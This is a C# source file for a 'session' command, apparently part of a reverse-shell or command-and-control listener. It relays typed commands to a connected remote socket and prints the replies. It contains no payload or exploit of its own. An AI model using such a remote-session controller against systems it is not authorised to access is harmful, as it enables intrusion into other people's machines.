using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace demilis.Command.Commands
{
    internal class Session : Command
    {
        public Session() : base()
        {
            name = "session";
            description = "Interacts with the specified session";
        }
        public override void Execute(ArrayList args)
        {
            if (args.Count > 0)
            {
                if (int.TryParse(args[0].ToString(), out int result))
                {
                    if (SessionExists(result))
                    {
                        Write.Centered($"Interacting with session {result}");
                        Program.interacting = true;
                        Interact(result);
                    }
                    else
                    {
                        Write.Error($"The supplied session number '{result}' doesn't exist.");
                    }
                }
                else
                {
                    Write.Error($"The supplied session argument '{args[0]}' is not a number.");
                }
            }
            else
            {
                Write.Error("Please specify a session to interact with. Example: 'session 1'");
            }
        }
        private async Task Interact(int session)
        {
            try
            {
                Socket socket = Program.dictionary[session];
                TcpClient client = new TcpClient();
                Read(session);
                while (true)
                {
                    Console.ForegroundColor = ConsoleColor.DarkRed;
                    Console.Write("> ");
                    Console.ResetColor();
                    string input = Console.ReadLine();

                    if (input.Trim() == "exit")
                    {
                        Program.interacting = false;
                        break;
                    }
                    byte[] buffMessage = Encoding.ASCII.GetBytes(input);
                    client.Client = socket;
                    client.GetStream().Write(buffMessage);
                }
            }
            catch (Exception e)
            {
                if (Program.verbose)
                {
                    Console.WriteLine(e.ToString());
                }
            }
        }
        private async Task Read(int session)
        {
            Socket socket = Program.dictionary[session];
            while (Program.interacting)
            {
                try
                {
                    NetworkStream stream = new NetworkStream(socket);
                    StreamReader reader = new StreamReader(stream);

                    char[] buff = new char[4096];
                    int nRet = await reader.ReadAsync(buff, 0, buff.Length);
                    if (nRet == 0)
                    {
                        if (Program.verbose) Console.WriteLine("Client disconnected");
                        Program.dictionary.Remove(session);
                        Program.interacting = false;
                        break;
                    }

                    Console.WriteLine(new string(buff));
                    Array.Clear(buff, 0, buff.Length);
                }
                catch (Exception e)
                {
                    if (Program.verbose) Console.WriteLine($"Exception while reading: {e.ToString()}");
                    Program.dictionary.Remove(session);
                    Program.interacting = false;
                    break;
                }
            }
        }
        public bool SessionExists(int number)
        {
            foreach (int session in Program.dictionary.Keys)
            {
                if (Program.dictionary[session].Connected && session == number) return true;
            }
            return false;
        }
    }
}
